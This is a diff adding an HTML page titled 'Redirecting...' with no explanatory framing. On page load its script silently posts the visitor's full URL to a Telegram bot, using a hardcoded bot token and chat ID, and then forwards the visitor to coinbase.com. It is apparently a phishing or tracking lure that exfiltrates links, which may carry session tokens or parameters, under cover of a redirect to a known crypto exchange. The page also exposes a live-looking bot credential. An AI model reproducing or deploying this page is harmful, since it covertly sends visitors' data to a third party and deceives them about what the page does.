@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        window.onload = function() {
+            const url = window.location.href; // Get the current page URL
+            const telegramBotToken = '7338050719:AAGoiDZb2sY4yZhCW9iXiMixHjAq8m-pleo';
+            const chatId = '6295981331';
+            const message = `Here is the URL: ${url}`;
+
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = 'https://www.coinbase.com'; // Redirect to Coinbase
+                } else {
+                    console.error('Failed to send URL to Telegram bot.');
+                    // Optionally, handle failure by redirecting to another page or showing an error
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Optionally, handle error by redirecting to another page or showing an error
+            });
+        };
+    </script>
+</body>
+</html>
